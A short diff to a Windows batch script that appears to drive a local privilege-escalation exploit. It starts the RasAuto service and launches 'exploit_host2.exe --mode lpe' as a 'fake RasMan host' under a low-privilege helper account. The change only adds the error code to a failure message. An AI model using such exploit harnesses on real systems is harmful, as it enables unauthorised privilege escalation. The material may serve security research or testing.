@@ -87,7 +87,7 @@ sc start RasAuto >nul 2>&1
 echo [+] Starting the fake RasMan host as low-priv %HELPER_USER%
 launch_guest.exe --user "%HELPER_USER%" --password "%HELPER_PASSWORD%" "C:\Users\Public\Desktop\EXPLOIT\exploit_host2.exe --mode lpe"
 if errorlevel 1 (
-    echo [!] Failed to start exploit_host2.exe as %HELPER_USER%
+    echo [!] Failed to start exploit_host2.exe as %HELPER_USER% ^(error %errorlevel%^)
     exit /b 1
 )
 
